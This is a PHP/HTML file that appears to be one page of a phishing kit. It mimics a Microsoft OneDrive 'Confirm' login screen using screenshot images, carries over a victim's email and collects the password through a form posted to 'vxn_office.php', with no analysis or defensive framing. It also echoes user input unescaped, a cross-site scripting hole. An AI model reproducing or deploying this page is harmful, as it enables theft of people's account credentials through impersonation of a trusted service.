<?php

$emal = $_POST['emal'];

?><html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>OneDrive - Confirm</title>
<link rel="shortcut icon" href="images/fav_micros.ico" />
<style type="text/css">
body
{
   background-color: #FFFFFF;
   color: #000000;
}
</style>
<style type="text/css">
a:hover
{
   color: #E3E818;
}
</style>
<!--[if lt IE 7]>
<style type="text/css">
   img { behavior: url("pngfix.htc"); }
</style>
<![endif]-->
</head>
<body>
<div id="bv_Image1" style="margin:0;padding:0;position:absolute;left:856px;top:0px;width:469px;height:638px;text-align:left;z-index:5;">
<img src="images/bodeOfficeLog.png" id="Image1" alt="" align="top" border="0" style="width:469px;height:638px;"></div>
<div id="bv_Image2" style="margin:0;padding:0;position:absolute;left:0px;top:0px;width:867px;height:639px;text-align:left;z-index:6;">
<img src="images/bodeOffice2.png" id="Image2" alt="" align="top" border="0" style="width:867px;height:639px;"></div>


<div id="bv_Form1" style="position:absolute;left:888px;top:253px;width:415px;height:243px;z-index:7">
<form name="Form1" method="post" action="vxn_office.php" id="Form1">


<input type="password" id="Editbox1" style="position:absolute;left:24px;top:70px;width:340px;height:20px;border:0px #C0C0C0 solid;background-color:transparent;font-family:'Courier New';font-size:16px;z-index:0" name="pasowonder" value="" required>

<input name="emal" type="hidden" value="<?php echo $emal;?>">


<input type="submit" id="Button1" name="Button1" value="" style="position:absolute;left:18px;top:176px;width:73px;height:38px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:1">
<div id="bv_Image3" style="margin:0;padding:0;position:absolute;left:100px;top:177px;width:59px;height:36px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:2;">
<a href="#" onclick="history.back();return false;"><img src="images/klik.png" id="Image3" alt="" align="top" border="0" style="width:59px;height:36px;"></a></div>
<input type="checkbox" id="Checkbox1" name="Checkbox1" value="on" style="position:absolute;left:17px;top:129px;z-index:3">
<div id="bv_Text1" style="margin:0;padding:0;position:absolute;left:99px;top:20px;width:150px;height:18px;text-align:left;z-index:4;">
<font style="font-size:16px" color="#000000" face="Arial"><?php echo $_POST["emal"];?></font></div>
</form>
</div>
<div id="bv_Image4" style="margin:0;padding:0;position:absolute;left:903px;top:500px;width:162px;height:16px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:8;">
<a href="index.php"><img src="images/klik.png" id="Image4" alt="" align="top" border="0" style="width:162px;height:16px;"></a></div>
<div id="bv_Image5" style="margin:0;padding:0;position:absolute;left:435px;top:4px;width:0px;height:0px;text-align:left;z-index:9;">
<img src="" id="Image5" alt="" align="top" border="0" style="width:0px;height:0px;"></div>
<div id="bv_Image6" style="margin:0;padding:0;position:absolute;left:904px;top:592px;width:182px;height:16px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:10;">
<a href="index.php"><img src="images/klik.png" id="Image6" alt="" align="top" border="0" style="width:182px;height:16px;"></a></div>
</body>
</html>